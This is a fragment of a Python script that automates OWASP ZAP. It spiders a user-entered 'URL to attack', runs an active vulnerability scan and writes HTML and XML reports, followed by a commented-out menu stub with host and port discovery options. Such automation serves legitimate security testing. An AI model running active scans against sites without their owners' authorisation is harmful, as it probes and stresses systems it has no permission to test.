    input("Press enter to continue once ZAP finishes booting up...")
    time.sleep(5)
    apikey = 'test'
    zap = ZAPv2(apikey=apikey)
    target = input('Enter the URL to attack (eg. http://example/.com): ')    
    print('Accessing target:', target)
    zap.urlopen(target)

    # Spider the target URL
    print('Spidering target URL...')
    zap.spider.scan(target)

    # Wait for the spidering to complete
    while int(zap.spider.status()) < 100:
        print('Spider progress:', zap.spider.status(), '%')
        time.sleep(2)

    # Start the active scan
    print('Starting active scan...')
    zap.ascan.scan(target)

    # Wait for the active scan to complete
    while int(zap.ascan.status()) < 100:
        print('Active scan progress:', zap.ascan.status(), '%')
        time.sleep(5)

    # Generate the report
    print('Generating report...')
    report_html = zap.core.htmlreport()
    report_xml = zap.core.xmlreport()

    # Save the report to a file
    with open('report.html', 'w') as f:
        f.write(report_html)

    with open('report.xml', 'w') as f:
        f.write(report_xml)
    

project_menu()


#MENU TEMPLATE FOR REPORT

#def vulnscanning_menu():
#    vulnscanning_loop = True
#    while vulnscanning_loop == True:
#        #Input Scanning Options
#        print("\nPlease Select an Option Below.")
#        print("1. Option 1")
#        print("2. Option 2")
#        print("3. Exit")
#        menu_input = (input("Select option: "))
#        if menu_input == "1":
#            ascii_1 = pyfiglet.figlet_format("Option 1")
#            print(ascii_1)
#            hostDiscovery()
#        elif menu_input == "2":
#            ascii_2 = pyfiglet.figlet_format("Option 2")
#            print(ascii_2)
#            portDiscovery()
#        elif menu_input == "3":
#            vulnscanning_loop = False
#        else:
#            print("Invalid Input!\nPlease Try Again!")
#            continue